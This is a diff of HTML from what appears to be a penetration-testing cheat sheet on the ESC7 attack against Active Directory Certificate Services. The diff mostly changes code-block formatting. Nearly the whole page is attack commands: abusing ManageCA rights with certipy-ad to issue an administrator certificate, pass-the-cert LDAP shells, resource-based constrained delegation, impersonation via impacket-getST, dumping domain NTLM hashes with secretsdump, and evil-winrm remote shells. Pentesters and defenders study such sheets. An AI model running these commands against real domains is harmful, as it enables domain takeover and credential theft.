 <h3 id="esc7">ESC7</h3>
 <div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">+---------------------+
-</span></span><span class="line"><span class="cl">| Access Right        |
-</span></span><span class="line"><span class="cl">|=====================|
-</span></span><span class="line"><span class="cl">| Manage CA           |
-</span></span><span class="line"><span class="cl">| Manage Certificates |
-</span></span><span class="line"><span class="cl">+---------------------+
-</span></span></code></pre></div></div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">+---------------------+
+</span></span></span><span class="line"><span class="cl"><span class="go">| Access Right        |
+</span></span></span><span class="line"><span class="cl"><span class="go">|=====================|
+</span></span></span><span class="line"><span class="cl"><span class="go">| Manage CA           |
+</span></span></span><span class="line"><span class="cl"><span class="go">| Manage Certificates |
+</span></span></span><span class="line"><span class="cl"><span class="go">+---------------------+
+</span></span></span></code></pre></div></div>
 <br>
 <div>
 <p>
 <button data-tabset="set7" data-tabcontent="tab1" class="active">Linux</button>
 
-<div class="tabcontent" data-tabset="set7" data-tabcontent="tab1"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Use ManageCA privilege to add manage certificates permission</span>
-</span></span><span class="line"><span class="cl">certipy-ad ca -ca &lt;CA_NAME&gt; -add-officer &lt;USER&gt; -u &lt;USER&gt;@&lt;DOMAIN&gt; -p &lt;PASSWORD&gt;
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Check</span>
-</span></span><span class="line"><span class="cl">certipy-ad find -dc-ip &lt;DC&gt; -ns &lt;DC_IP&gt; -u &lt;USER&gt;@&lt;DOMAIN&gt; -p &lt;PASSWORD&gt; -vulnerable -stdout
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Request Cert based on SubCA (Take note: Request ID)</span>
-</span></span><span class="line"><span class="cl">certipy-ad req -ca &lt;CA_NAME&gt; -target &lt;TARGET_DOMAIN&gt; -template SubCA -upn administrator@&lt;DOMAIN&gt; -u &lt;USER&gt;@&lt;DOMAIN&gt; -p &lt;PASSWORD&gt;
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Issue request using ManageCA and Manage Certificates privilege</span>
-</span></span><span class="line"><span class="cl">certipy-ad ca -ca &lt;CA_NAME&gt; -issue-request &lt;Request_ID&gt; -u &lt;USER&gt;@&lt;DOMAIN&gt; -p &lt;PASSWORD&gt;
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">certipy-ad req -ca &lt;CA_NAME&gt; -target &lt;TARGET_DOMAIN&gt; -retrieve &lt;Request_ID&gt; -u &lt;USER&gt;@&lt;DOMAIN&gt; -p &lt;PASSWORD&gt;
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">certipy-ad auth -pfx administrator.pfx -dc-ip &lt;DC&gt;
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Remote</span>
-</span></span><span class="line"><span class="cl">evil-winrm -i &lt;TARGET&gt; -u administrator -H &lt;HASH&gt;
-</span></span></code></pre></div></div>
+<div class="tabcontent" data-tabset="set7" data-tabcontent="tab1"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Use ManageCA privilege to add manage certificates permission
+</span></span><span class="line"><span class="cl"><span class="go">certipy-ad ca -ca &lt;CA_NAME&gt; -add-officer &lt;USER&gt; -u &lt;USER&gt;@&lt;DOMAIN&gt; -p &#39;&lt;PASSWORD&gt;&#39;
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Check
+</span></span><span class="line"><span class="cl"><span class="go">certipy-ad find -dc-ip &lt;DC&gt; -ns &lt;DC_IP&gt; -u &lt;USER&gt;@&lt;DOMAIN&gt; -p &#39;&lt;PASSWORD&gt;&#39; -vulnerable -stdout
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Request Cert based on SubCA <span class="o">(</span>Take note: Request ID<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="go">certipy-ad req -ca &lt;CA_NAME&gt; -target &lt;TARGET_DOMAIN&gt; -template SubCA -upn administrator@&lt;DOMAIN&gt; -u &lt;USER&gt;@&lt;DOMAIN&gt; -p &#39;&lt;PASSWORD&gt;&#39;
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Issue request using ManageCA and Manage Certificates privilege
+</span></span><span class="line"><span class="cl"><span class="go">certipy-ad ca -ca &lt;CA_NAME&gt; -issue-request &lt;REQUEST_ID&gt; -u &lt;USER&gt;@&lt;DOMAIN&gt; -p &#39;&lt;PASSWORD&gt;&#39;
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">certipy-ad req -ca &lt;CA_NAME&gt; -target &lt;TARGET_DOMAIN&gt; -retrieve &lt;REQUEST_ID&gt; -u &lt;USER&gt;@&lt;DOMAIN&gt; -p &#39;&lt;PASSWORD&gt;&#39;
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">certipy-ad auth -pfx administrator.pfx -dc-ip &lt;DC&gt;
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Remote
+</span></span><span class="line"><span class="cl"><span class="go">evil-winrm -i &lt;TARGET&gt; -u administrator -H &lt;HASH&gt;
+</span></span></span></code></pre></div></div>
 </div></p>
 <br>
 <hr>
 <h3 id="workaround-kerberos-sessionerror-kdc_err_padata_type_nosupp">Workaround: Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP</h3>
 <h4 id="create-key-and-crt-from-pfx">Create key and crt from pfx</h4>
 <div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Create key from pfx</span>
-</span></span><span class="line"><span class="cl">certipy-ad cert -pfx administrator.pfx -nocert -out administrator.key
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Create cert from pfx</span>
-</span></span><span class="line"><span class="cl">certipy-ad cert -pfx administrator.pfx -nokey -out administrator.crt
-</span></span></code></pre></div></div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Create key from pfx
+</span></span><span class="line"><span class="cl"><span class="go">certipy-ad cert -pfx administrator.pfx -nocert -out administrator.key
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Create cert from pfx
+</span></span><span class="line"><span class="cl"><span class="go">certipy-ad cert -pfx administrator.pfx -nokey -out administrator.crt
+</span></span></span></code></pre></div></div>
 <p>
 <button data-tabset="set8" data-tabcontent="tab1" class="active">LDAP Shell</button>
 
 <button data-tabset="set8" data-tabcontent="tab2" >RBCD</button>
 
 <div class="tabcontent" data-tabset="set8" data-tabcontent="tab1"><div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># LDAP shell</span>
-</span></span><span class="line"><span class="cl">python3 PassTheCert/Python/passthecert.py -action ldap-shell -crt administrator.crt -key administrator.key -domain &lt;DOMAIN&gt; -dc-ip &lt;DC&gt;
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Add user to administrators group within the ldap shell</span>
-</span></span><span class="line"><span class="cl">add_user_to_group &lt;USER&gt; administrators
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Remote</span>
-</span></span><span class="line"><span class="cl">evil-winrm -i &lt;TARGET_DOMAIN&gt; -u &lt;USER&gt; -p &lt;PASSWORD&gt;
-</span></span></code></pre></div></div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> LDAP shell
+</span></span><span class="line"><span class="cl"><span class="go">python3 PassTheCert/Python/passthecert.py -action ldap-shell -crt administrator.crt -key administrator.key -domain &lt;DOMAIN&gt; -dc-ip &lt;DC&gt;
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Add user to administrators group within the ldap shell
+</span></span><span class="line"><span class="cl"><span class="go">add_user_to_group &lt;USER&gt; administrators
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Remote
+</span></span><span class="line"><span class="cl"><span class="go">evil-winrm -i &lt;TARGET_DOMAIN&gt; -u &lt;USER&gt; -p &#39;&lt;PASSWORD&gt;&#39;
+</span></span></span></code></pre></div></div>
 </div>
 
 <div class="tabcontent" data-tabset="set8" data-tabcontent="tab2"><div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python3 PassTheCert/Python/passthecert.py -action write_rbcd -delegate-to <span class="s1">&#39;&lt;TARGET_COMPUTER&gt;$&#39;</span> -delegate-from <span class="s1">&#39;Evil_Computer$&#39;</span> -crt administrator.crt -key administrator.key -domain &lt;DOMAIN&gt; -dc-ip &lt;DC&gt;
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo ntpdate -s &lt;DC&gt; <span class="o">&amp;&amp;</span> python3 impacket-getST -spn <span class="s1">&#39;cifs/&lt;TARGET_DOMAIN&gt;&#39;</span> -impersonate Administrator <span class="s1">&#39;&lt;DOMAIN&gt;/Evil_Computer$:&lt;PASSWORD&gt;&#39;</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span>Administrator.ccache
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">impacket-secretsdump &lt;DOMAIN&gt;/administrator@&lt;TARGET_DOMAIN&gt; -k -no-pass -just-dc-ntlm
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Remote</span>
-</span></span><span class="line"><span class="cl">evil-winrm -i &lt;TARGET_DOMAIN&gt; -u administrator -H &lt;HASH&gt;
-</span></span></code></pre></div></div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">python3 PassTheCert/Python/passthecert.py -action write_rbcd -delegate-to &#39;&lt;TARGET_COMPUTER&gt;$&#39; -delegate-from &#39;Evil_Computer$&#39; -crt administrator.crt -key administrator.key -domain &lt;DOMAIN&gt; -dc-ip &lt;DC&gt;
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">sudo ntpdate -s &lt;DC&gt; &amp;&amp; python3 impacket-getST -spn &#39;cifs/&lt;TARGET_DOMAIN&gt;&#39; -impersonate Administrator &#39;&lt;DOMAIN&gt;/Evil_Computer$:&lt;GENERATED_PASSWORD&gt;&#39;
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">export KRB5CCNAME=Administrator.ccache
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">impacket-secretsdump &#39;&lt;DOMAIN&gt;/administrator@&lt;TARGET_DOMAIN&gt;&#39; -k -no-pass -just-dc-ntlm
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Remote
+</span></span><span class="line"><span class="cl"><span class="go">evil-winrm -i &lt;TARGET_DOMAIN&gt; -u administrator -H &lt;HASH&gt;
+</span></span></span></code></pre></div></div>
 </div></p>
 <p><small><em>Ref: <a href="https://github.com/AlmondOffSec/PassTheCert">PassTheCert</a></em></small></p>
-<br></div></div>
+<br>
+</div></div>
     
     <script src="/js/utils.js"></script>
     <footer>
